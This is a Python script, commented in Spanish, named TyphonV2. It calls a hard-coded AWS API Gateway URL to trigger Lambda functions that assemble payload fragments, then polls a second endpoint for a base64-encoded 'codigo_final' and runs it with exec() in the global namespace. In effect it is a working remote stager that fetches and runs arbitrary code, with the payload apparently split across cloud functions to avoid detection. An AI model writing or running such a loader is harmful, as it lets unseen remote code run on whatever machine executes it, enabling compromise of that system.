import urllib.request
import json
import base64
import time

class TyphonV2:
    """
    Es una especie de Cliente Ligero, porque delega la orquestacion a AWS y simplemente hace polling hasta recibir el payload completo.
    
    """
    def __init__(self, url):
        self.url = url.rstrip('/')
        self.fragment_list = ["Campe", "Aethon"]
        self.endpoints = {f: f"{self.url}/{f}"for f in self.fragment_list }

    def execute(self):
        """
        Se hace un bucle de intentos para pedir el payload final a la lambda Aethon. Si no se encuentra se
        suma el contador de intentos. Cuando el contador iguale al maximo de intentos o se encuentre el codigo (action) entonces
        se saldra del bucle. Tambien hay un tiempo de espera entre intentos para dar mas tiempo a Aethon.
        
        Antes de todo se llama a Campe (la lambda activadora) para que active las lambdas de los fragmentos en AWS.
        
        Por ultimo, si se ha encontrado el codigo final en Aethon se ejecuta y si no, se envia un mensaje indicando que no se ha podido
        encontrar a tiempo el codigo final.
        
        """
        max_attempts = 6
        wait_time_seconds = 0.1
        action = None
        attempt = 0


        while attempt < max_attempts and not action:
            # Solo llamamos a Campe en el primer intento, porque no tiene sentido llamarlo todo el rato
            if attempt == 0:
                resp_campe = urllib.request.urlopen(self.endpoints["Campe"])
                response_json =  json.loads(resp_campe.read().decode('utf-8'))
                if response_json['statusCode'] != 200:
                    print(f"[ERROR] Campe ha fallado (Status {resp_campe.getcode()}): {resp_campe.read().decode('utf-8')}")
                    return None
                else:
                    body = json.loads(response_json['body'])
                    content = body['content']
                    print(content)
            else:
                print(f"[INFO] Intento {attempt} de {max_attempts}")
            
                time.sleep(wait_time_seconds)
                
                print(f"[INFO] Solicitando codigo ensamblado final a Aethon (Intento {attempt})")
                
                resp_aethon = urllib.request.urlopen(self.endpoints["Aethon"])
                response_json =  json.loads(resp_aethon.read().decode('utf-8'))

                # Si el codigo de estado es correcto, 200, se procede a decodificar el codigo que viene en json
                if response_json['statusCode'] == 200:
                    
                    body = json.loads(response_json['body'])
                    codigo_b64 = base64.b64decode(body['codigo_final'])
                    if codigo_b64:
                        action = codigo_b64.decode('utf-8')
                        print("[SUCCESS] Payload unido recibido con éxito.")
                        exec(action, globals())
                    
                elif response_json['statusCode'] == 404:
                    print("[INFO] El payload todavia no esta listo en S3")
                else:
                    print(f"[ERROR] Error en Aethon: {resp_aethon.getcode()}")
                
            attempt = attempt + 1
        if not action:
            print("\n[FATAL_ERROR] No se ha podido encontrar a tiempo el codigo ensamblado")

if __name__ == "__main__":
    # URL de la nueva API Gateway 
    URL_API = "https://prb2najqrf.execute-api.us-east-1.amazonaws.com/TyphonS2"
    
    typhon = TyphonV2(URL_API)
    typhon.execute()
